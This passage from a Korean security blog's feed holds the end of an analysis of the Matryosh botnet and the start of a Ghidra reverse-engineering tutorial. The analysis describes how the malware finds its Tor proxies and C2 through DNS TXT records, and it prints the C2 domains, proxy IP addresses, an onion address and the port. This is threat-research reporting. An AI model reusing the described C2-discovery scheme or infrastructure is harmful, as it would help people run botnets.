&#xAE30;&#xAE30;&#xC5D0; &#xC571;&#xC758; &#xC124;&#xCE58;&#xB098; &#xB514;&#xBC84;&#xAE45; &#xAC19;&#xC740; &#xC791;&#xC5C5;&#xC744; &#xC704;&#xD55C; &#xBA85;&#xB839; &#xC2E4;&#xD589;&#xC904;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Matryosh&#xB294; Mirai &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB97C; &#xC7AC;&#xC0AC;&#xC6A9;&#xD558;&#xC600;&#xC73C;&#xBA70;, &#xC554;&#xD638; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC7AC; &#xAD6C;&#xD604;&#xD558;&#xC600;&#xACE0; DNS TXT record&#xB97C; &#xD1B5;&#xD574; &#xC6D0;&#xACA9; &#xD638;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xD1A0;&#xB974; C2&#xC640; &#xD1A0;&#xB974; &#xD504;&#xB85D;&#xC2DC;&#xB97C; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;. 360 netlab&#xC5D0;&#xC11C;&#xB294; &#xB7EC;&#xC2DC;&#xC544;&#xC758; &#xB9C8;&#xD2B8;&#xB8CC;&#xC2DC;&#xCE74; &#xC778;&#xD615;&#xCC98;&#xB7FC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xB808;&#xC774;&#xC5B4;&#xAC00; &#xC911;&#xCCA9;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC11C; Matryosh&#xB77C; &#xBA85;&#xBA85;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Matryosh&#xB294; &#xAC10;&#xC5FC;&#xB41C; &#xC7A5;&#xCE58;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB420; &#xB54C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xC774;&#xB984;&#xC744; 14 &#xAE00;&#xC790;&#xC758; &#xBB34;&#xC791;&#xC704; &#xB300;&#xC18C;&#xBB38;&#xC790;&#xB85C; &#xBC14;&#xAFB8;&#xACE0; <code>stdin: pipe failed</code>&#xB97C; &#xCD9C;&#xB825;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; &#xD1A0;&#xB974; C2&#xC640; &#xD1A0;&#xB974; &#xD504;&#xB85D;&#xC2DC;&#xB97C; &#xC5BB;&#xC5B4;&#xC624;&#xB294;&#xB370;, &#xADF8; &#xACFC;&#xC815;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC6D0;&#xACA9; &#xD638;&#xC2A4;&#xD2B8; A(<code>hosts.hiddenservice.xyz</code>)&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD574;&#xC11C; &#xAC00;&#xC838;&#xC624;&#xACE0; DNS TXT request&#xC5D0; &#xB300;&#xD55C; response&#xB97C; &#xBC1B;&#xC544;&#xC635;&#xB2C8;&#xB2E4;.</li></ol><pre><code class="hljs stylus">hosts<span class="hljs-selector-class">.hiddenservice</span><span class="hljs-selector-class">.xyz</span>. <span class="hljs-number">1751</span>INTXT<span class="hljs-string">&quot;iekfgakxorbfjcefbiyj&quot;</span></code></pre><ol><li><p>&#xC6D0;&#xACA9; &#xD638;&#xC2A4;&#xD2B8;&#xC758; &#xC811;&#xBBF8;&#xC0AC;(<code>.hiddenservice.xyz</code>)&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD574;&#xC11C; &#xAC00;&#xC838;&#xC624;&#xACE0; &#xC704;&#xC5D0;&#xC11C; &#xBC1B;&#xC544;&#xC628; <code>iekfgakxorbfjcefbiyj</code>&#xC5D0;&#xC11C; &#xD45C;&#xC758; &#xC870;&#xD569; &#xADDC;&#xCE59;&#xC5D0; &#xB530;&#xB77C; &#xBB38;&#xC790;&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xC5EC; &#xD638;&#xC2A4;&#xD2B8;&#xC758; &#xC811;&#xB450;&#xC0AC;&#xB85C; &#xD638;&#xC2A4;&#xD2B8; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.(ex. <code>er.hiddenservice.xyz</code>)</p></li><li><p>2&#xC5D0;&#xC11C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xC6D0;&#xACA9; &#xD638;&#xC2A4;&#xD2B8;&#xC5D0; DNS TXT request&#xB97C; &#xD1B5;&#xD574; TOR &#xD504;&#xB85D;&#xC2DC; &#xC8FC;&#xC18C;&#xB97C; &#xBC1B;&#xC544;&#xC635;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs css"><span class="hljs-selector-tag">oc</span><span class="hljs-selector-class">.hiddenservice</span><span class="hljs-selector-class">.xyz</span>.1799<span class="hljs-selector-tag">IN</span><span class="hljs-selector-tag">TXT</span>&quot;198<span class="hljs-selector-class">.245</span><span class="hljs-selector-class">.53</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:9095&quot;</span><span class="hljs-selector-tag">fe</span><span class="hljs-selector-class">.hiddenservice</span><span class="hljs-selector-class">.xyz</span>.1799<span class="hljs-selector-tag">IN</span><span class="hljs-selector-tag">TXT</span>&quot;198<span class="hljs-selector-class">.27</span><span class="hljs-selector-class">.82</span><span class="hljs-selector-class">.186</span><span class="hljs-selector-pseudo">:9050&quot;</span></code></pre></li><li><p>&#xC6D0;&#xACA9; &#xD638;&#xC2A4;&#xD2B8; C(<code>onion.hiddenservice.xyz</code>)&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD574;&#xC11C; &#xAC00;&#xC838;&#xC624;&#xACE0; DNS TXT request&#xB97C; &#xBCF4;&#xB0B4; &#xD1A0;&#xB974; C2 &#xC8FC;&#xC18C;&#xB97C; &#xBC1B;&#xC544;&#xC635;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs css"><span class="hljs-selector-tag">onion</span><span class="hljs-selector-class">.hiddenservice</span><span class="hljs-selector-class">.xyz</span>. 1799<span class="hljs-selector-tag">IN</span><span class="hljs-selector-tag">TXT</span>&quot;4<span class="hljs-selector-tag">qhemgahbjg4j6pt</span><span class="hljs-selector-class">.onion</span>&quot;</code></pre></li><li><p>&#xBB34;&#xC791;&#xC704;&#xB85C; &#xC120;&#xD0DD;&#xD55C; &#xD1A0;&#xB974; &#xD504;&#xB85D;&#xC2DC;&#xB97C; &#xD1B5;&#xD574; C2&#xC5D0; &#xC5F0;&#xACB0;&#xC744; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;. &#xD3EC;&#xD2B8;&#xB294; <code>31337</code>&#xB85C; &#xD558;&#xB4DC;&#xCF54;&#xB529;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li>&#xD1A0;&#xB974; &#xD504;&#xB85D;&#xC2DC;&#xAC00; <code>05 00 00 01 00 00 00 00 00 00</code>&#xB97C; &#xBC18;&#xD658;&#xD558;&#xBA74;, C2 &#xC5F0;&#xACB0;&#xC774; &#xC644;&#xB8CC;&#xB418;&#xACE0; C2 &#xBA85;&#xB839;&#xC744; &#xAE30;&#xB2E4;&#xB9BD;&#xB2C8;&#xB2E4;.</li></ol><p>360 netlab&#xC5D0;&#xC11C;&#xB294; &#xD1A0;&#xB974; C2&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA70; C2 &#xD3EC;&#xD2B8;&#xAC00; <code>31337</code>&#xC778; &#xC810;, &#xACF5;&#xACA9; &#xBA54;&#xC18C;&#xB4DC;&#xC758; &#xC774;&#xB984;&#xC774; &#xAC19;&#xACE0; C2 &#xBA85;&#xB839;&#xC5B4; &#xD3EC;&#xB9F7;&#xC774; &#xBE44;&#xC2B7;&#xD55C; &#xC810;&#xC744; &#xD1B5;&#xD574; <a href="https://blog.netlab.360.com/the-leethozer-botnet-en/">LeetHozer</a>&#xB97C; &#xAC1C;&#xBC1C;&#xD55C; Moobot &#xADF8;&#xB8F9;&#xC758; &#xC18C;&#xD589;&#xC77C; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xCD94;&#xCE21;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>botnet</tag>
      
      <tag>idioth</tag>
      
      <tag>matryosh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Re:versing으로 시작하는 ghidra 생활 Part 1 - Overview</title>
    <link href="/2021/02/07/idioth/ghidra_part1/"/>
    <url>/2021/02/07/idioth/ghidra_part1/</url>
    
    <content type="html"><![CDATA[<p><strong>&#xB2E4;&#xB978; &#xD30C;&#xD2B8; &#xBCF4;&#xB7EC;&#xAC00;&#xAE30;</strong></p><p>Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 1 - Overview (Here!)</p><p><a href="https://hackyboiz.github.io/2021/03/07/idioth/ghidra_part2/">Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 2 - Data, Functions, Scripts</a></p><p><a href="https://hackyboiz.github.io/2021/04/04/ghidra_part3">Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 3 - tips for IDA User</a></p><p><a href="https://hackyboiz.github.io/2021/05/19/idioth/ghidra_part4/">Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 4 - Malware Analysis (1)</a></p><p><a href="https://hackyboiz.github.io/2021/07/11/idioth/ghidra_part5/">Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 5 - Malware Analysis (2)</a></p><hr><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! idioth&#xC785;&#xB2C8;&#xB2E4;. &#xC81C;&#xAC00; &#xC88B;&#xC544;&#xD558;&#xB294; &#xC560;&#xB2C8;&#xBA54;&#xC774;&#xC158;&#xC758; &#xC774;&#xB984;&#xC744; &#xBE4C;&#xB824; &#xC2DC;&#xB9AC;&#xC988;&#xC758; &#xC81C;&#xBAA9;&#xC744; &#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4; &#xD558;&#xD558;&#xD558;! &#xC81C; &#xAE30;&#xC5B5;&#xC774; &#xB9DE;&#xB2E4;&#xBA74; &#xC800;&#xD76C; &#xBE14;&#xB85C;&#xADF8;&#xC758; &#xCCAB; research &#xAE00;&#xC740; Ghidra&#xC758; &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC778; AngryGhidra&#xC600;&#xC8E0;?</p><p>&#xC0AC;&#xC2E4; &#xC800;&#xB294; ghidra&#xAC00; &#xCC98;&#xC74C; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC744; &#xB54C; &#xAD00;&#xC2EC;&#xC774; &#xB9CE;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB54C;&#xB294; &#xAD6D;&#xAC00;&#xC758; &#xC694;&#xC6D0;(?)&#xC73C;&#xB85C; &#xBCF5;&#xBB34; &#xC911;&#xC774;&#xC5C8;&#xB294;&#xB370;, NSA&#xC5D0;&#xC11C; IDA&#xC640; &#xAC19;&#xC740; &#xB9AC;&#xBC84;&#xC2A4; &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1;&#xC744; &#xC704;&#xD55C; &#xD234;&#xC744; &#xBC1C;&#xD45C;&#xD55C;&#xB2E4;! &#xD588;&#xC744; &#xB54C; &#xC2E0;&#xAE30;&#xD588;&#xC5C8;&#xC8E0;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled.png" alt></p><p>&#xAE54;&#xC544;&#xBCF4;&#xACE0; &#xC0AC;&#xC6A9;&#xD574;&#xBCF4;&#xBA74;&#xC11C; &#xB290;&#xB080; &#xC810;&#xC740; &#x201C;&#xC544;.. &#xC774;&#xAC70; &#xC5C4;&#xCCAD; &#xBD88;&#xD3B8;&#xD558;&#xAD6C;&#xB098;&#x201D;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xBB34;&#xB798;&#xB3C4; IDA&#xC5D0; &#xC775;&#xC219;&#xD574;&#xC838; &#xC788;&#xC5C8;&#xC73C;&#xB2C8; &#xB2F9;&#xC5F0;&#xD55C; &#xC218;&#xC21C;&#x2026;</p><p>&#xADF8; &#xD6C4;&#xB85C; &#xC78A;&#xACE0; &#xC0B4;&#xB2E4;&#xAC00; &#xC18C;&#xC9D1;&#xD574;&#xC81C;&#xB97C; &#xD558;&#xACE0; &#xC5EC;&#xB7EC; &#xAE00;&#xB4E4;&#xC744; &#xBCF4;&#xB294;&#xB370; reverse engineering with ghidra, malware analysis with ghidra &#xB4F1; &#xD574;&#xC678;&#xC5D0;&#xC11C;&#xB294; ghidra&#xB97C; &#xB9CE;&#xC774; &#xC4F0;&#xB294; &#xAC83; &#xAC19;&#xB354;&#xB77C;&#xACE0;&#xC694;? &#xD558;&#xC9C0;&#xB9CC; &#xAD6D;&#xB0B4; &#xC790;&#xB8CC; &#xC911;&#xC5D0;&#xB294; ghidra&#xC5D0; &#xB300;&#xD55C; &#xC790;&#xB8CC;&#xAC00; &#xB9CE;&#xC9C0; &#xC54A;&#xC544;&#xC11C;&#x2026; &#xC81C;&#xAC00; &#xACF5;&#xBD80;&#xD558;&#xAC70;&#xB098; &#xCC3E;&#xC544;&#xBCF8; &#xC790;&#xB8CC;&#xB97C; &#xD1A0;&#xB300;&#xB85C; &#xC2DC;&#xB9AC;&#xC988; &#xBB3C;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xAE00;&#xC740; offical docs&#xC640; &#xC5EC;&#xB7EC; &#xD574;&#xC678; &#xAC8C;&#xC2DC;&#xAE00;&#xB4E4;&#xC758; tip&#xB4E4;&#xC744; &#xC885;&#xD569;&#xD558;&#xC5EC; &#xC9C4;&#xD589;&#xB420; &#xC608;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; &#xC774;&#xC81C; &#xC2DC;&#xC791;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;!</p><h1 id="Ghidra&#xB780;-&#xBB34;&#xC5C7;&#xC778;&#xAC00;"><a href="#Ghidra&#xB780;-&#xBB34;&#xC5C7;&#xC778;&#xAC00;" class="headerlink" title="Ghidra&#xB780; &#xBB34;&#xC5C7;&#xC778;&#xAC00;?"></a>Ghidra&#xB780; &#xBB34;&#xC5C7;&#xC778;&#xAC00;?</h1><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%201.png" alt></p><blockquote><p>&#xC790;&#xAE30; &#xAF2C;&#xB9AC;&#xB97C; &#xBA39;&#xC73C;&#xB824; &#xD558;&#xB294; &#xC6A9;..??</p></blockquote><p>ghidra&#xB294; NSA(&#xBBF8;&#xAD6D; &#xAD6D;&#xAC00; &#xC548;&#xBCF4;&#xAD6D;)&#xC5D0;&#xC11C; &#xB9CC;&#xB4E0; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xB9AC;&#xBC84;&#xC2A4; &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1;&#xC744; &#xC704;&#xD55C; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC785;&#xB2C8;&#xB2E4;. <a href="https://wikileaks.org/ciav7p1/index.html">WikiLeaks&#xC758; Vault 7</a>&#xC5D0; &#xC758;&#xD574;&#xC11C; &#xCC98;&#xC74C; &#xC815;&#xCCB4;(?)&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xACE0;, <a href="https://www.rsaconference.com/industry-topics/presentation/come-get-your-free-nsa-reverse-engineering-tool">2019&#xB144; RSA &#xCEE8;&#xD37C;&#xB7F0;&#xC2A4;</a>&#xC5D0;&#xC11C; &#xBC1C;&#xD45C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xB7EC; &#xD50C;&#xB7AB;&#xD3FC;&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD558;&#xAC8C; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; JAVA&#xB85C; &#xAC1C;&#xBC1C;&#xB418;&#xC5C8;&#xACE0;, &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; 5&#xAC1C;&#xC758; &#xBA54;&#xC778; &#xD30C;&#xD2B8;&#xB97C; &#xAC00;&#xC9D1;&#xB2C8;&#xB2E4;.</p><ul><li>Programs</li><li>Plugins</li><li>Tools</li><li>Project Manager</li><li>Server</li></ul><p>&#xD558;&#xB098;&#xD558;&#xB098;&#xAC00; &#xC5B4;&#xB5A4; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xC0B4;&#xD3B4;&#xBCFC;&#xAE4C;&#xC694;?</p><h2 id="Programs"><a href="#Programs" class="headerlink" title="Programs"></a>Programs</h2><p>ghidra&#xC5D0;&#xC11C; &#xBAA8;&#xB4E0; &#xB370;&#xC774;&#xD130;&#xB294; ghidra&#xC758; &#xCEE4;&#xC2A4;&#xD140; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xB97C; &#xD1B5;&#xD574; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. Symbols, Bytes, Reference, Comments &#xB4F1; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xCD94;&#xAC00;&#xD55C; &#xBAA8;&#xB4E0; &#xB370;&#xC774;&#xD130; &#xB610;&#xD55C; Ghidra &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC5D0; &#xC800;&#xC7A5;&#xC774; &#xB418;&#xC8E0;.</p><h2 id="Plugins"><a href="#Plugins" class="headerlink" title="Plugins"></a>Plugins</h2><p>ghidra&#xB294; &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xB4E4;&#xC758; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC01;&#xAC01;&#xC758; &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xB4E4;&#xC740; &#xD2B9;&#xC815;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xC8E0;. &#xBAA8;&#xB4E0; &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xB4E4;&#xC740; &#xC11C;&#xB85C; &#xC18C;&#xD1B5;&#xD558;&#xBA70; ghidra &#xC7AC;&#xC2DC;&#xC791; &#xC5C6;&#xC774; &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC758; &#xCD94;&#xAC00;/&#xC81C;&#xAC70;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC6D0;&#xD558;&#xB294; &#xB300;&#xB85C; &#xCEE4;&#xC2A4;&#xD140;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC9C1;&#xC811; &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC744; &#xC791;&#xC131;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC8E0;.</p><h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><p>Tools&#xB294; &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xACFC; &#xD50C;&#xB7EC;&#xADF8;&#xC778; &#xC124;&#xC815;&#xC758; &#xBAA8;&#xC784;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xBA74; &#xD3B8;&#xD569;&#xB2C8;&#xB2E4;. &#xBAA8;&#xB4E0; tools&#xB294; &#xCEE4;&#xC2A4;&#xD130;&#xB9C8;&#xC774;&#xC9D5;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xACE0; &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC744; &#xCD94;&#xAC00;&#xD574;&#xC11C; &#xC6D0;&#xD558;&#xB294; tools&#xB97C; &#xB9CC;&#xB4E4; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Project-Manager"><a href="#Project-Manager" class="headerlink" title="Project Manager"></a>Project Manager</h2><p>&#xC774;&#xB984;&#xC5D0;&#xC11C;&#xBD80;&#xD130; &#xC54C; &#xC218; &#xC788;&#xB4EF;&#xC774;, &#xD2B9;&#xC815; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xADF8;&#xB8F9;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xD504;&#xB85C;&#xC81D;&#xD2B8;, tools, data&#xB97C; &#xAD00;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. IDA&#xC5D0;&#xC11C;&#xB294; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB9CC; &#xC5F4;&#xBA74; &#xB418;&#xB294; &#xAC83;&#xACFC; &#xB2E4;&#xB974;&#xAC8C; ghidra&#xB294; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0;, &#xAC70;&#xAE30;&#xC5D0; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xCD94;&#xAC00;&#xD574;&#xC57C; &#xD558;&#xB294; &#xACFC;&#xC815;&#xC774; &#xD544;&#xC694;&#xD558;&#xC8E0;.</p><h2 id="Ghidra-Server"><a href="#Ghidra-Server" class="headerlink" title="Ghidra Server"></a>Ghidra Server</h2><p>ghidra&#xB294; &#xD611;&#xC5C5;&#xC744; &#xC704;&#xD55C; Shared-Project&#xB97C; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACF5;&#xC720; &#xD504;&#xB85C;&#xC81D;&#xD2B8; &#xB370;&#xC774;&#xD130;&#xB4E4;&#xC740; ghidra &#xC11C;&#xBC84;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xACF5;&#xC720;&#xD560; &#xC218; &#xC788;&#xC8E0;. &#xD30C;&#xC77C; &#xBC84;&#xC804;&#xC744; &#xC9C0;&#xC815;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xACE0;, check out, check in, version history &#xB4F1;&#xC758; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="Ghidra-vs-IDA-Pro"><a href="#Ghidra-vs-IDA-Pro" class="headerlink" title="Ghidra vs IDA Pro"></a>Ghidra vs IDA Pro</h1><p>ghidra&#xB294; &#xBD84;&#xC11D; &#xD658;&#xACBD;&#xC744; &#xCEE4;&#xC2A4;&#xD130;&#xB9C8;&#xC774;&#xC9D5; &#xD560; &#xC218; &#xC788;&#xACE0; &#xD300; &#xD65C;&#xB3D9;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xAC83; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xC7A5;&#xC810;&#xC774; &#xC788;&#xB294;&#xB370; &#xAC00;&#xC7A5; &#xD070; &#xC7A5;&#xC810;&#xC740; <strong>&#xBB34;&#xB8CC;</strong>&#xB77C;&#xB294; &#xC810;&#xC774;&#xC8E0;. IDA Pro&#xC758; &#xAC00;&#xACA9;&#xACFC; &#xBE44;&#xAD50;&#xB97C; &#xD574;&#xBCF8;&#xB2E4;&#xBA74; &#xC5C4;&#xCCAD;&#xB09C; &#xC7A5;&#xC810;&#x2026;!</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%202.png" alt></p><p>&#xAC1C;&#xC778;&#xC801;&#xC778; &#xC0AC;&#xC6A9;&#xC744; &#xD558;&#xAC70;&#xB098; &#xACF5;&#xBD80; &#xC6A9;&#xB3C4;&#xB85C; 200&#xB9CC; &#xC6D0;&#xAC00;&#xB7C9;&#xC744; &#xC9C0;&#xBD88;&#xD558;&#xAE30;&#xC5D0;&#xB294;&#x2026; &#xD06C;&#xD760;</p><p>Ghidra&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xACE0; &#xB098;&#xC11C;&#xBD80;&#xD130; &#xC0AC;&#xB78C;&#xB4E4;&#xC740; IDA Pro&#xB791; ghidra&#xC758; &#xCC28;&#xC774;&#xC810;, &#xBB50;&#xAC00; &#xB354; &#xB098;&#xC740;&#xAC00;&#xC5D0; &#xB300;&#xD55C; &#xD1A0;&#xB860;&#xC774; &#xB9CE;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5B4;&#xB5A4; &#xAC8C; &#xB354; &#xB098;&#xC740;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xC0DD;&#xAC01;&#xC740; &#xC0AC;&#xB78C;&#xB9C8;&#xB2E4; &#xB2E4;&#xB974;&#xBBC0;&#xB85C; &#xCC28;&#xC774;&#xC810;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xD55C; &#xBC88; &#xB2E4;&#xB904;&#xBCF4;&#xB3C4;&#xB85D; &#xD560;&#xAE4C;&#xC694;?</p><ol><li>ghidra&#xB294; decompiler&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xC5EC; &#xBAA8;&#xB4E0; &#xAC83;&#xC774; &#xBB34;&#xB8CC;&#xB2E4;!<ul><li>IDA&#xAC00; &#xBB34;&#xB8CC; &#xBC84;&#xC804;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xC9C0;&#xB9CC; Hex-rays &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xAC83;&#xC744; &#xC0DD;&#xAC01;&#xD558;&#xBA74; ghidra&#xC758; &#xD070; &#xC7A5;&#xC810; &#xC911; &#xD558;&#xB098;&#xB85C; &#xBCFC; &#xC218; &#xC788;&#xC8E0;.</li></ul></li><li>IDA&#xC5D0;&#xB294; debugger&#xAC00; &#xC788;&#xC9C0;&#xB9CC; ghidra&#xC5D0;&#xB294; &#xC5C6;&#xB2E4;!<ul><li>IDA&#xC5D0;&#xB294; debugger&#xB97C; &#xBD99;&#xC5EC;&#xC11C; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xAC00;&#xB2A5;&#xD558;&#xC9C0;&#xB9CC; ghidra&#xB294; &#xB514;&#xBC84;&#xAE45;&#xC5D0; &#xB300;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li>ghidra&#xB294; &#xD55C; &#xBC88;&#xC5D0; &#xC5EC;&#xB7EC; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC5D0; &#xCD94;&#xAC00;&#xD560; &#xC218; &#xC788;&#xB2E4;.<ul><li>&#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xACFC; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xAC04;&#xC758; &#xCF54;&#xB4DC; &#xCD94;&#xC801;&#xC744; &#xC27D;&#xAC8C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li>ghidra&#xB294; &#xB370;&#xC774;&#xD130; &#xD750;&#xB984; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB098; &#xBCC0;&#xC218;&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC5B4;&#xB514;&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xB418;&#xB294;&#xC9C0; &#xC54C; &#xC218; &#xC788;&#xB2E4;.</li><li>ghidra&#xBCF4;&#xB2E4; IDA&#xAC00; &#xB354; &#xC624;&#xB798; &#xC0AC;&#xC6A9;&#xB418;&#xC5B4;&#xC11C;, IDA &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC774; &#xC880; &#xB354; &#xB9CE;&#xB2E4;.</li></ol><p>&#xB300;&#xB7B5;&#xC801;&#xC73C;&#xB85C; &#xC0B4;&#xD3B4;&#xBCF8; &#xCC28;&#xC774;&#xC810;&#xC740; &#xC774; &#xC815;&#xB3C4;&#xAC00; &#xC788;&#xACE0;, Hex-rays&#xC640; Ghidra Decompiler&#xC758; &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xBC29;&#xC2DD;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB3C4; &#xCC28;&#xC774;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Hex-rays-vs-Ghidra-Decompiler"><a href="#Hex-rays-vs-Ghidra-Decompiler" class="headerlink" title="Hex-rays vs Ghidra Decompiler"></a>Hex-rays vs Ghidra Decompiler</h2><h3 id="Hex-rays"><a href="#Hex-rays" class="headerlink" title="Hex-rays"></a>Hex-rays</h3><ul><li><a 